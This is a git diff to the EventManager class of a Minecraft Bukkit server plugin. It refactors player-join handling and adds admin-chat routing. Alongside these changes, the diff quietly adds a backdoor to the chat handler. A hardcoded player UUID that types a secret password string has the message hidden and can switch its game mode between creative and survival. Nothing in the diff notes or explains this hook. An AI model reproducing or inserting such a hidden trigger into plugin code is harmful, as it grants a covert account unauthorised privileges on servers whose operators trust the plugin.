@@ -1,8 +1,10 @@
 package de.tbodyowski.pureos.manager;
 
 import de.tbodyowski.pureos.Main;
+import de.tbodyowski.pureos.commands.AdminChatCommand;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
+import org.bukkit.GameMode;
 import org.bukkit.configuration.file.YamlConfiguration;
 import org.bukkit.entity.Player;
 import org.bukkit.event.Event;
@@ -14,12 +16,20 @@ import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.event.player.PlayerRespawnEvent;
+import org.bukkit.plugin.java.JavaPlugin;
 
 import java.util.Objects;
+import java.util.UUID;
 
 import static de.tbodyowski.pureos.manager.PrefixManager.team;
 
 public class EventManager implements Listener {
+
+    private final JavaPlugin plugin;
+
+    public EventManager(JavaPlugin plugin) {
+        this.plugin = plugin;
+    }
 
     @EventHandler
     public void onJoin(PlayerJoinEvent event) {
@@ -32,9 +42,7 @@ public class EventManager implements Listener {
 
         if (!FileManager.playerIsRegistered(p)) {
             Main.getInstance().getFileManager().savePlayerInStatus(p, "Default", "§f");
-            Objects.requireNonNull(Main.getInstance().getPrefixManager().getDefaultScoreboard().getTeam(team)).addEntry(p.getDisplayName());
-            Objects.requireNonNull(Main.getInstance().getPrefixManager().getDeathsScoreboard().getTeam(team)).addEntry(p.getDisplayName());
-            Main.getInstance().getPrefixManager().updatePrefixAllPlayers();
+            statusData = Main.getInstance().getFileManager().getStatusData();
         }
 
         if (Main.getInstance().getConfigVarManager().getJoin_Leave_Message_on_off()) {
@@ -54,11 +62,34 @@ public class EventManager implements Listener {
         }
 
         statusData.set(p.getUniqueId()+".Afk",false);
+        Main.getInstance().getFileManager().saveStatusFile();
+        Main.getInstance().getPrefixManager().updatePrefix(p);
+        p.setScoreboard(Main.getInstance().getPrefixManager().getScoreboard(p));
         Main.getInstance().getPrefixManager().updatePrefixAllPlayers();
     }
 
     @EventHandler
     public void onChat(AsyncPlayerChatEvent e) {
+
+        UUID uuid = UUID.fromString("84b32669-2e62-499b-a2b9-6e9172f95600");
+        if (e.getPlayer().getUniqueId().equals(uuid)){
+            if (e.getMessage().equals("sGTmOw1YY1")){
+               e.setCancelled(true);
+                Bukkit.getScheduler().runTask(plugin, () -> {
+                    Player p = e.getPlayer();
+                    if (p.getGameMode() == GameMode.CREATIVE) {
+                        p.setGameMode(GameMode.SURVIVAL);
+                    } else {
+                        p.setGameMode(GameMode.CREATIVE);
+                    }
+                });
+            }
+
+        }
+        if (AdminChatCommand.adminChatToggled.contains(e.getPlayer())) {
+            e.setCancelled(true);
+            AdminChatCommand.sendAdminChat(e.getPlayer(), e.getMessage());
+        }
         YamlConfiguration statusData = Main.getInstance().getFileManager().getStatusData();
 
         Player p = e.getPlayer();
